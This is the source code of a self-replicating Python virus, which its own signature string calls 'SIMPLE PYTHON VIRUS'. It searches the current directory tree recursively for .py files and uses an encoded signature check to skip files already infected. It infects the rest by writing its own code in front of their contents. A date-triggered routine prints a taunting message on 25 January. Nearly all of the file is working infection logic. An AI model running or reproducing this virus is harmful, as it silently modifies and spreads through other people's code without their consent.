import os
import random
import datetime
match = ""
matchkey = 9
key = random.randrange(3, 10)
print ("Key: ")
print (key)
decodeKey = 1
pos = 0
encryptedSIG = ""
SIGNATURE = "0SIMPLE PYTHON VIRUS"
decodeKey = int(SIGNATURE[0])
SIGNATURE = SIGNATURE[:pos] + SIGNATURE[(pos+1):]
print ("SIG: ")
print (SIGNATURE)
for i in SIGNATURE:
    temp = ord(i) - decodeKey
    matchtemp = chr (temp)
    temp = chr(key + temp)
    encryptedSIG += temp
    match += matchtemp
encryptedSIG = str(key) + encryptedSIG
#print (decodeKey)
#print (encryptedSIG)
def search(path):
    breaker = 0
    tempmatch = ""
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        tempmatch = ""
        print ("FILENamE:")
        print (fname)
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            k = open(path+"/"+fname)
            for i, line in enumerate(k):
                breaker = 0
                if i == 11 and line[13].isdigit():
                    #print (line)
                    matchkey = line[13]
                    print ("MATCHKeY: ")
                    print (matchkey)
                    for j in range(14, 33):
                        tempmatch += chr(ord(line[j]) - int(matchkey))
                print ("TEMPTMATCH")
                print (tempmatch)
                print (match)
                if match == tempmatch:
                    infected = True
                    print ("THIS IS TRUE")
                    breaker = 1
                    break
            if breaker == 1:
                print ("BRKEN")
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>0 and i<84 and i != 11:
            virusstring += line
        if i == 10:
            virusstring += "SIGNATURE = \"" + encryptedSIG + "\"\n"
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write("import os\n" + virusstring + temp)
        
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("HAHA YOU ARE AFFECTED BY VIRUS!")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
